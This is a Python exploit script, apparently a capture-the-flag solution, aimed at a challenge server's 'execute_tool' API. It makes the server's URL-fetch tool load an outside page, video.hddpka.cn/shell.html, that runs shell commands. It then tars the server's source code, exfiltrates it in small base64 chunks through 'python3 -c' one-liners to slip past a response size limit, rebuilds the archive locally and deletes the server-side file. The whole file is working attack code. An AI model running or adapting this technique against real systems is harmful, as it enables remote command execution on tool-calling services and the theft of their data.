import requests
import json
import base64
import re
import os
import urllib.parse
import ast
import time

# Configuration
EXPLOT_URL = "https://video.hddpka.cn/shell.html"
TARGET_API = "http://cloud-middle.hgame.vidar.club:30411/execute_tool"

def get_cmd_output(cmd):
    final_url = f"{EXPLOT_URL}?c={urllib.parse.quote(cmd)}"
    payload = {
        "name": "py_request",
        "arguments": {
            "url": final_url
        }
    }
    
    try:
        resp = requests.post(TARGET_API, json=payload, headers={"Content-Type": "application/json"})
        if resp.status_code != 200:
            print(f"[-] HTTP Error: {resp.status_code}")
            return None
            
        res_json = resp.json()
        if res_json.get("code") != 1:
            print(f"[-] API Error Code: {res_json}")
            return None
            
        raw_inner = res_json.get("result", "")
        # The result of py_request is a JSON string: "{\"status_code\": 200, \"content\": \"...\"}"
        try:
            inner_json = json.loads(raw_inner)
            page_content = inner_json.get("content", "")
        except:
             return None
        
        if "|||RESULT_START|||" in page_content:
            start = page_content.find("|||RESULT_START|||") + len("|||RESULT_START|||")
            end = page_content.find("|||RESULT_END|||")
            if end == -1: end = len(page_content) # If no end marker (truncated)
            result_str = page_content[start:end]
            
            # The result is a python dict str repr: "{'subprocess': ..., 'output': '...'}"
            # Extract 'output' or fallback
            if "'output': '" in result_str:
                parts = result_str.split("'output': '")
                if len(parts) > 1:
                    val = parts[1]
                    # Handle possible truncation/end
                    if val.endswith("'}"): val = val[:-2]
                    elif val.endswith("'"): val = val[:-1]
                    return val

            return result_str
        else:
            return None
            
    except Exception as e:
        print(f"[-] Exception: {e}")
        return None

def download_source():
    print("[*] Starting chunked download (bypassing 300 char limit)...")
    
    zip_path = "/tmp/source_dump.tar.gz"
    # Clean previous
    get_cmd_output(f"rm -f {zip_path}")
    
    print("[*] Creating tarball on server...")
    # Tar source without pyc
    create_cmd = f"tar -czf {zip_path} --exclude=*.pyc --exclude=__pycache__ --exclude=.* ."
    get_cmd_output(create_cmd)
    
    # Check size
    size_out = get_cmd_output(f"stat -c %s {zip_path}")
    if not size_out or not size_out.strip().isdigit():
        print(f"[-] Failed to get file size. Output: {size_out}")
        return
        
    total_size = int(size_out.strip())
    print(f"[+] Total size: {total_size} bytes")
    
    # Download chunks
    # Max readable content is 300.
    # We use python to seek and read and print base64.
    # Base64 expansion 4/3. 
    # Python script itself takes some space in the limited response? No, script is input.
    # Response limit is 300.
    # "|||RESULT_START|||{'subprocess': ..., 'output': 'BASE64...'}|||RESULT_END|||"
    # Framework overhead ~ 50-80 chars.
    # Safe data payload ~ 200 chars.
    # 200 chars base64 = 150 bytes.
    chunk_size = 150
    downloaded_size = 0
    
    local_filename = "server_dump.tar.gz"
    with open(local_filename, "wb") as f:
        pass # clear file
        
    for offset in range(0, total_size, chunk_size):
        # Python script to seek and read
        # Using raw python3 -c to avoid quoting issues in bash -> python
        # We need to print EXACTLY the base64 string
        # import sys,base64; f=open('/tmp/source_dump.tar.gz','rb'); f.seek(OFFSET); d=f.read(SIZE); print(base64.b64encode(d).decode(), end='')
        
        py_script = f"import sys,base64;f=open('{zip_path}','rb');f.seek({offset});d=f.read({chunk_size});print(base64.b64encode(d).decode(),end='')"
        cmd = f"python3 -c \"{py_script}\""
        
        b64_chunk = get_cmd_output(cmd)
        
        if not b64_chunk:
            print(f"\n[-] Failed to fetch chunk at {offset}")
            break
            
        # Clean up any potential garbage
        b64_chunk = b64_chunk.strip()
        # Remove python dict artifacts if specific parsing failed
        b64_chunk = re.sub(r'[^a-zA-Z0-9+/=]', '', b64_chunk)
        
        try:
            chunk_data = base64.b64decode(b64_chunk)
            with open(local_filename, "ab") as f:
                f.write(chunk_data)
                
            downloaded_size += len(chunk_data)
            print(f"\r[*] Progress: {downloaded_size}/{total_size} bytes ({downloaded_size/total_size*100:.1f}%)", end="")
        except Exception as e:
            print(f"\n[-] Decode error at {offset}: {e}")
            break
            
    print(f"\n[+] Download finished. Saved to {local_filename}")
    
    # Extract
    print("[*] Extracting...")
    extract_path = "ServerSource"
    if not os.path.exists(extract_path):
        os.makedirs(extract_path)
        
    try:
        import tarfile
        if tarfile.is_tarfile(local_filename):
            with tarfile.open(local_filename, 'r:gz') as tar:
                tar.extractall(extract_path)
            print(f"[+] Download and extraction successful! Files in '{extract_path}/'")
            # Cleanup server file
            get_cmd_output(f"rm {zip_path}")
        else:
             print("[-] Downloaded file is corrupted (not a valid tar.gz).")
    except Exception as e:
        print(f"[-] Extraction error: {e}")

if __name__ == "__main__":
    download_source()
